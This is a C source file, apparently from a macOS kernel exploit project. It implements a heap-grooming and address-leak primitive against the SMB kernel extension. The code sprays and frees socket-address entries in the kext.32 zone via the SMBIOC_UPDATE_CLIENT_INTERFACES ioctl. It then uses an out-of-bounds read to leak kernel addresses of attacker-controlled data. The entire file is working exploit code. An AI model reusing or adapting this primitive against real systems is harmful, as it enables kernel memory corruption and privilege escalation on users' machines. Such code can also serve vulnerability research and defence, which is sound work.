//
//  zalloc_kext_small.c
//  kmem_xepg
//
//  Created by admin on 12/27/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include <dispatch/dispatch.h>
#include <sys/proc_info.h>
#include <sys/errno.h>

#include <xpl/util/misc.h>
#include <xpl/util/log.h>
#include <xpl/util/assert.h>

#include <smbfs/netbios.h>
#include <macos/kernel.h>

#include "../smb/nic_allocator.h"
#include "../smb/ssn_allocator.h"

#include "kheap_alloc.h"
#include "oob_reader_base.h"
#include "allocator_rw.h"
#include "allocator_prpw.h"


///
/// The `SMBIOC_UPDATE_CLIENT_INTERFACES` is used to associate IP addresses to a
/// NIC. The IP address associated to a NIC are stored in the member `addr_list` of
/// `struct complete_nic_info_entry`. The `addr_list` is a tailq and has elements of type
/// `struct sock_addr_entry`. For each IP address associated to a NIC, a corresponding
/// `struct sock_addr_entry` is also allocated and added to the `addr_list` tailq.
///
/// The format of `struct sock_addr_entry` is as follows:-
///
/// struct sock_addr_entry {
///     struct sockaddr* addr;
///     TAILQ_ENTRY(sock_addr_entry) next;
/// };
///
/// The member `addr` is used to store the memory location of associated socket address and the
/// member `next` is used to refer to `previous` and `next` tailq entries. By reading the member
/// `addr` using the OOB read provided by module xpl_oob_reader_base.c, we can determine the
/// address of an allocated socket address.
///
/// This module allocates multiple socket addresses with user provided data. This would lead to
/// multiple `struct sock_addr_entry` allocations in kext.32 zone. Then it would free some of these
/// allocated socket address which would also release the corresponding `struct sock_addr_entry`
/// leading to creation of gaps in kext.32 zone. Then it would use the OOB read functionality
/// provided by xpl_oob_reader_base.c to read succeeding kext.32 zone elements. It would validate
/// the members `addr` and `next` of the read data and verify it is a valid `struct sock_addr_entry`.
/// If it is not valid, the process is repeated again, otherwise the value of pointer `addr` is
/// returned to the caller
///


#define NUM_PAD_ELEMENTS (xpl_PAGE_SIZE / 32)
#define NUM_GAP_ELEMENTS (xpl_PAGE_SIZE / 32 * 2)

#define MAX_TRIES 25
#define MAX_SESSIONS 200

const int zone_kext_sizes[] = {
    16, 32, 48, 64, 80, 96, 128, 160, 192, 224, 256
};

/// Scan the netbios name for valid `struct sock_addr_entry`. The member `addr` is also validated
/// to make sure it is a valid address of a zone element from a zone with `z_elem_size`
int xpl_kheap_alloc_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, uintptr_t* out) {
    static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
    uint8_t sock_addr_entry_zone = 32;
    /// Extract only OOB read data
    int skip_bytes = sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name);
    int read_bytes = sizeof(struct sock_addr_entry);
    if (len < skip_bytes + read_bytes) {
        return ENOENT;
    }
    
    struct sock_addr_entry entry;
    memcpy(&entry, name + skip_bytes, sizeof(entry));
    
    uintptr_t allocated_address = (uintptr_t)entry.addr;
    uintptr_t prev = (uintptr_t)entry.next.tqe_prev;
    uintptr_t next = (uintptr_t)entry.next.tqe_next;
    
    if (!xpl_vm_kernel_address_valid(allocated_address)) {
        return ENOENT;
    }
    
    /// The `tqe_prev` of a tailq entry is always intialized
    if (!xpl_vm_kernel_address_valid(prev)) {
        return ENOENT;
    }
    
    /// Address of previous tailq entry
    uintptr_t prev_entry_addr = prev - offsetof(struct sock_addr_entry, next.tqe_next);
    /// `struct sock_addr_entry` is allocated from kext.32 zone. Address of elements from this
    /// zone must be divisible by 32
    if (prev_entry_addr % 32 != 0) {
        return ENOENT;
    }
    
    /// The `tqe_next` is a valid address for all elements except for last element in the tailq
    /// We will ignore last elements of tailq since they are rare
    if (!xpl_vm_kernel_address_valid(next)) {
        return ENOENT;
    }
    
    /// Check for valid kext.32 zone element address
    if (next % 32 != 0) {
        return ENOENT;
    }
    
    /// Since the socket address will be allocated on zone with element size `z_elem_size`,
    /// the page local address of allocated_address should be divisible by z_elem_size
    /// NOTE 1: this is not always TRUE when `z_chunk_pages` of the zone is greater than 1. But
    /// in `KHEAP_KEXT`, the smallest zone with `z_chunk_pages > 1` is having element size
    /// 288 bytes. Since we can only allocate socket addresses with upto 255 bytes, we won't
    /// have to worry about them
    if ((allocated_address & (xpl_PAGE_SIZE - 1)) % z_elem_size != 0) {
        return ENOENT;
    }
    
    *out = allocated_address;
    return 0;
}

int xpl_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, uint8_t sa_family, const char* data, uint8_t data_size, uint8_t data_offset, struct xpl_kheap_alloc_entry* out) {
    xpl_assert_cond(alloc_size, <=, 255);
    
    int min_data_offset = 0;
    if (sa_family == AF_INET) {
        /// `data` will be placed after field `sin_addr`. We need to make repeated allocations
        /// using socket addresses with user provided data. When address family is `AF_INET`,
        /// the new address is compared with all the existing `AF_INET` socket addresses in
        /// `nic->addr_list` tailq. If a socket address with same `sin_addr` value exist, the new
        /// one will be ignored. So we need to change `sin_addr`value for each allocation
        min_data_offset = offsetof(struct sockaddr_in, sin_addr) + sizeof(struct in_addr);
    } else if (sa_family == AF_INET6) {
        /// `data` will be placed after field `sin6_addr`. When address family is `AF_INET6`,
        /// the new socket address to be associated is compared with all other `AF_INET6`
        /// addresses in `nic->addr_list`. If an entry already exist with same `sin6_addr`,
        /// the address will be ignored
        min_data_offset = offsetof(struct sockaddr_in6, sin6_addr) + sizeof(struct in6_addr);
    } else {
        /// `data` will be placed on field `sa_data`. If the address family is other than
        /// `AF_INET` or `AF_INET6`, it will always be inserted. Allocations of this type
        /// should be minimized because it will lead to logging of a lot of warning messages
        /// which will take time and might have adverse effects on the kernel heap
        min_data_offset = offsetof(struct sockaddr, sa_data);
    }
    
    xpl_assert_cond(data_offset, >=, min_data_offset);
    xpl_assert_cond(data_size + data_offset, <=, alloc_size);
    
    int zone_size = -1;
    for (int i = 0; i < xpl_array_size(zone_kext_sizes); i++) {
        if (zone_kext_sizes[i] >= alloc_size) {
            zone_size = zone_kext_sizes[i];
            break;
        }
    }
    xpl_assert(zone_size > 0);
    
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    xpl_allocator_prpw_t element_allocator = xpl_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);

    /// Allocate alternating `struct sock_addr_entry` elements in kext.32 zone. First sock addr
    /// entry will be a placeholder element and second will have the member `addr` pointing
    /// to the socket address with user provided data
    for (int gap_idx = 0; gap_idx < NUM_GAP_ELEMENTS; gap_idx++) {
        struct network_nic_info gap_info;
        bzero(&gap_info, sizeof(gap_info));
        gap_info.nic_index = 0;
        gap_info.addr_4.sin_family = AF_INET;
        gap_info.addr_4.sin_len = sizeof(struct sockaddr_in);
        gap_info.addr_4.sin_addr.s_addr = gap_idx;
        
        /// Allocate a placeholder `struct sock_addr_entry` element in kext.kalloc.32 zone
        int error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
        xpl_assert_err(error);
        
        /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr`
        error = xpl_allocator_prpw_allocate(element_allocator, alloc_size, sa_family, data, data_size, data_offset);
        xpl_assert_err(error);
    }
    
    /// Release placeholder elements
    int error = smb_nic_allocator_destroy(&gap_allocator);
    xpl_assert_err(error);
    
    uintptr_t value = 0;
    for (int try = 0; try < MAX_TRIES; try++) {        
        static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
        uint8_t sock_addr_entry_zone = 32;
        
        /// Value of `sa_len` field of socket address
        uint8_t nb_len = sock_addr_entry_zone + sizeof(struct sock_addr_entry);
        /// `ioc_saddr_len` and `ioc_laddr_len`
        uint32_t ioc_len = sock_addr_entry_zone;
        /// Size of netbios name (`snb_name`) first segment
        uint8_t snb_name = sizeof(struct sock_addr_entry) + (sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name));
        
        uint32_t server_name_size = snb_name;
        char server_nb_name[server_name_size];
        
        uint32_t local_name_size = snb_name;
        char local_nb_name[local_name_size];
        
        struct xpl_oob_reader_base_args params;
        params.smb_addr = *smb_addr;
        params.saddr_snb_len = nb_len;
        params.saddr_ioc_len = ioc_len;
        params.saddr_snb_name_seglen = snb_name;
        params.laddr_snb_len = nb_len;
        params.laddr_ioc_len = ioc_len;
        params.laddr_snb_name_seglen = snb_name;
        
        /// Allocate saddr and laddr in `kext.kalloc.32` zone and read their succeeding zone element
        xpl_oob_reader_base_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
        xpl_assert_cond(server_name_size, ==, snb_name + 2);
        xpl_assert_cond(local_name_size, ==, snb_name + 2);
        
        /// Check if OOB read of saddr is a value of type `struct sock_addr_entry` having field `addr`
        /// from zone with element size `zone_size`
        if (!xpl_kheap_alloc_scan_nb_name(server_nb_name, sizeof(server_nb_name), zone_size, &value)) {
            break;
        }
        
        /// Check if OOB read of laddr is a value of type `struct sock_addr_entry` having field `addr`
        /// from zone with element size `zone_size`
        if (!xpl_kheap_alloc_scan_nb_name(local_nb_name, sizeof(local_nb_name), zone_size, &value)) {
            break;
        }
    }
        
    if (value) {
        out->address = value;
        out->element_allocator = element_allocator;
        return 0;
    } else {
        xpl_allocator_prpw_destroy(&element_allocator);
        return EAGAIN;
    }
}


struct xpl_kheap_alloc_entry xpl_kheap_alloc(const struct sockaddr_in* smb_addr, uint8_t alloc_size, uint8_t sa_family, const char* data, uint8_t data_size, uint8_t data_offset) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        struct xpl_kheap_alloc_entry entry;
        int error = xpl_kheap_alloc_try(smb_addr, alloc_size, sa_family, data, data_size, data_offset, &entry);
        if (!error) {
            return entry;
        }
    }
    xpl_log_error("alloc failed");
    xpl_abort();
}
